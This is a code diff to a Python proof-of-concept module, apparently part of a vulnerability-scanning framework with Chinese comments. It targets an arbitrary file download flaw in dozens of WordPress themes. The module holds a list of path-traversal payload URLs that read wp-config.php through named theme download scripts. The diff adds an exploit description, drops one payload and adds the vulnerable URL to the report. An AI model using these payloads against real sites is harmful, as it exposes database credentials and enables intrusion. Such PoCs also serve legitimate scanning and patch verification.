@@ -12,6 +12,10 @@ class Vuln(ABVuln):
     disclosure_date = '2014-12-24'  # 漏洞公布时间
     desc = '''
         download_file" variable is not sanitized.
+        This exploit allows the attacker to exploit the flaw Arbitrary File
+        Download in dozens of wordpress themes.
+        Through regular expressions, the script will perform the check for each
+        target url checking your wp-config.php file.
     '''  # 漏洞描述
     ref = 'https://packetstormsecurity.com/files/129706/wptheme-download.txt'  # 漏洞来源
     cnvd_id = 'Unkonwn'  # cnvd漏洞编号
@@ -50,8 +54,7 @@ class Poc(ABPoc):
                 '/wp-content/themes/churchope/lib/downloadlink.php?file=../../../../wp-config.php',
                 '/wp-content/themes/lote27/download.php?download=../../../wp-config.php',
                 '/wp-content/themes/RedSteel/download.php?file=../../../wp-config.php',
-                '/wp-content/themes/linenity/functions/download.php?imgurl=../../../../wp-config.php',
-                '/wp-content/themes/mTheme-Unus/css/css.php?files=../../../../wp-config.php'
+                '/wp-content/themes/linenity/functions/download.php?imgurl=../../../../wp-config.php'
             ]
 
             for filename in payload:
@@ -65,8 +68,8 @@ class Poc(ABPoc):
                     #args['success'] = True
                     #args['poc_ret']['file_path'].append(verify_url)
                     self.target = verify_url
-                    self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
-                        target=self.target, name=self.vuln.name))
+                    self.output.report(self.vuln, '发现{target}存在{name}漏洞，漏洞地址为{url}'.format(
+                        target=self.target, name=self.vuln.name, url=url))
 
         except Exception, e:
             self.output.info('执行异常{}'.format(e))
